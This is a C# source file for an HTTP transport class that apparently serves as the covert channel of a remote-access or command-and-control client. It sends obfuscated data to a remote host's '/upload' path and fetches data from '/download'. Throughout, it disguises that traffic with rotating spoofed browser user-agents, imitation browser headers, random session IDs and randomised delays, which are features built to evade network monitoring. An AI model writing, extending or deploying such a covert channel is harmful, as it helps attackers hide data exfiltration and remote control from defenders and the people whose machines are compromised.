using Client.Helper;
using System;
using System.IO;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using System.Text;

namespace Client.Connection
{
    public class HttpTransport : ITransport
    {
        private HttpWebRequest currentRequest;
        private HttpWebResponse currentResponse;
        private Stream responseStream;
        private MemoryStream sendBuffer;
        private string baseUrl;
        private bool isConnected;
        private readonly string[] userAgents = {
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        };

        public bool IsConnected => isConnected;
        public int Available => responseStream?.CanRead == true ? (int)(responseStream.Length - responseStream.Position) : 0;

        public bool Connect(string host, int port)
        {
            try
            {
                string protocol = port == 443 ? "https" : "http";
                baseUrl = $"{protocol}://{host}:{port}";
                
                HttpWebRequest testRequest = (HttpWebRequest)WebRequest.Create(baseUrl);
                testRequest.Method = "GET";
                testRequest.UserAgent = GetRandomUserAgent();
                testRequest.Timeout = 10000;
                testRequest.KeepAlive = true;
                
                using (HttpWebResponse testResponse = (HttpWebResponse)testRequest.GetResponse())
                {
                    isConnected = testResponse.StatusCode == HttpStatusCode.OK;
                }
                
                sendBuffer = new MemoryStream();
                return isConnected;
            }
            catch
            {
                isConnected = false;
                return false;
            }
        }

        public void Send(byte[] data)
        {
            try
            {
                if (!isConnected) return;
                
                byte[] obfuscatedData = TrafficObfuscator.ApplyMultiLayerObfuscation(data);
                
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(baseUrl + "/upload");
                request.Method = "POST";
                request.ContentType = "application/octet-stream";
                request.UserAgent = GetRandomUserAgent();
                request.Headers.Add("X-Session-ID", TrafficObfuscator.GenerateRandomSessionId());
                request.Headers.Add("X-Request-Time", TrafficObfuscator.GetRandomTimestamp().ToString());
                request.Headers.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
                request.Headers.Add("Accept-Language", "en-US,en;q=0.9");
                request.Headers.Add("Accept-Encoding", "gzip, deflate, br");
                request.Headers.Add("DNT", "1");
                request.Headers.Add("Connection", "keep-alive");
                request.Headers.Add("Upgrade-Insecure-Requests", "1");
                request.ContentLength = obfuscatedData.Length;
                request.KeepAlive = true;
                
                TrafficObfuscator.AddRandomDelay();
                
                using (Stream requestStream = request.GetRequestStream())
                {
                    requestStream.Write(obfuscatedData, 0, obfuscatedData.Length);
                }
                
                using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
                {
                    if (response.StatusCode != HttpStatusCode.OK)
                    {
                        isConnected = false;
                    }
                }
            }
            catch
            {
                isConnected = false;
            }
        }

        public byte[] Receive(int size)
        {
            try
            {
                if (!isConnected) return null;
                
                if (responseStream == null || !responseStream.CanRead)
                {
                    HttpWebRequest request = (HttpWebRequest)WebRequest.Create(baseUrl + "/download");
                    request.Method = "GET";
                    request.UserAgent = GetRandomUserAgent();
                    request.Headers.Add("X-Session-ID", TrafficObfuscator.GenerateRandomSessionId());
                    request.Headers.Add("X-Request-Time", TrafficObfuscator.GetRandomTimestamp().ToString());
                    request.Headers.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
                    request.Headers.Add("Accept-Language", "en-US,en;q=0.9");
                    request.Headers.Add("Accept-Encoding", "gzip, deflate, br");
                    request.Headers.Add("DNT", "1");
                    request.Headers.Add("Connection", "keep-alive");
                    request.KeepAlive = true;
                    
                    TrafficObfuscator.AddRandomDelay();
                    
                    currentResponse = (HttpWebResponse)request.GetResponse();
                    responseStream = currentResponse.GetResponseStream();
                }
                
                byte[] buffer = new byte[size];
                int bytesRead = responseStream.Read(buffer, 0, size);
                
                if (bytesRead == 0)
                {
                    responseStream?.Close();
                    currentResponse?.Close();
                    responseStream = null;
                    return null;
                }
                
                byte[] receivedData;
                if (bytesRead < size)
                {
                    receivedData = new byte[bytesRead];
                    Buffer.BlockCopy(buffer, 0, receivedData, 0, bytesRead);
                }
                else
                {
                    receivedData = buffer;
                }
                
                byte[] deobfuscatedData = TrafficObfuscator.RemoveMultiLayerObfuscation(receivedData);
                return deobfuscatedData ?? receivedData;
            }
            catch
            {
                isConnected = false;
                return null;
            }
        }

        public void Disconnect()
        {
            try
            {
                responseStream?.Close();
                currentResponse?.Close();
                sendBuffer?.Close();
                isConnected = false;
            }
            catch (Exception ex)
            {
                ErrorHandler.HandleNonCritical(() => { }, ex, "HttpTransport disconnect failed");
            }
        }

        public Socket GetSocket()
        {
            return null;
        }

        public X509Certificate2 GetCertificate()
        {
            return null;
        }

        private string GetRandomUserAgent()
        {
            return userAgents[new Random().Next(userAgents.Length)];
        }
    }
}
